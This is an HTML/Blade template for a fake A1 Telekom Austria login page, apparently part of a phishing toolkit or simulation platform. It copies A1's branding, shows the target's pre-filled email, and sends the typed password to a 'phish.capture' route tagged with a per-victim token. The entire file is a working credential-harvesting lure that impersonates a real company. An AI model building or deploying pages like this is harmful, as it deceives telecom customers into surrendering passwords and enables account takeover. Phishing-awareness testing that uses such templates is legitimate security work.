<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>A1 Login</title>
    <link rel="icon" href="https://www.a1.net/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'A1 Sans',-apple-system,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;border-radius:12px;padding:40px;width:100%;max-width:420px;box-shadow:0 2px 12px rgba(0,0,0,.06);text-align:center}
        .logo-section{margin-bottom:24px}
        .a1-logo{font-size:36px;font-weight:900;color:#e2001a;letter-spacing:-1px}
        h1{font-size:22px;color:#1a1a1a;margin-bottom:8px;font-weight:600}
        .sub{font-size:14px;color:#666;margin-bottom:28px}
        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f5f5f5;border-radius:8px;margin-bottom:24px;text-align:left}
        .email-display .icon{width:36px;height:36px;border-radius:50%;background:#e2001a;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700;margin-right:12px;flex-shrink:0}
        .email-display .text{font-size:14px;color:#333;font-weight:500}
        .form-group{text-align:left;margin-bottom:16px}
        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:600}
        .form-group input{width:100%;height:44px;padding:0 16px;font-size:15px;border:1px solid #ccc;border-radius:8px;outline:none;background:#fff;transition:border-color .2s}
        .form-group input:focus{border-color:#e2001a;box-shadow:0 0 0 3px rgba(226,0,26,.1)}
        .form-row{display:flex;align-items:center;gap:8px;margin-bottom:20px}
        .form-row input[type="checkbox"]{width:16px;height:16px;cursor:pointer}
        .form-row label{font-size:13px;color:#666;cursor:pointer}
        .btn-login{width:100%;height:48px;background:#e2001a;color:#fff;border:none;border-radius:24px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s}
        .btn-login:hover{background:#c80018}
        .btn-login:active{background:#b00015}
        .links-row{display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:#e2001a;text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .footer{margin-top:24px;font-size:11px;color:#999}
        @media(max-width:480px){.card{padding:32px 24px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo-section">
            <div class="a1-logo">A1</div>
        </div>

        <h1>Willkommen</h1>
        <p class="sub">Melden Sie sich mit Ihrem A1 Konto an.</p>

        <div class="email-display">
            <div class="icon">{{ strtoupper(substr($email, 0, 1)) }}</div>
            <div class="text">{{ $email }}</div>
        </div>

        <form action="{{ route('phish.capture', ['provider' => 'a1', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Passwort</label>
                <input type="password" id="password" name="password" required autofocus>
            </div>

            <div class="form-row">
                <input type="checkbox" id="keepLogin" checked>
                <label for="keepLogin">Angemeldet bleiben</label>
            </div>

            <button type="submit" class="btn-login">Anmelden</button>
        </form>

        <div class="links-row">
            <a href="#">Passwort vergessen?</a>
            <a href="#">Hilfe</a>
        </div>

        <div class="footer">© 2026 A1 Telekom Austria</div>
    </div>
</body>
</html>
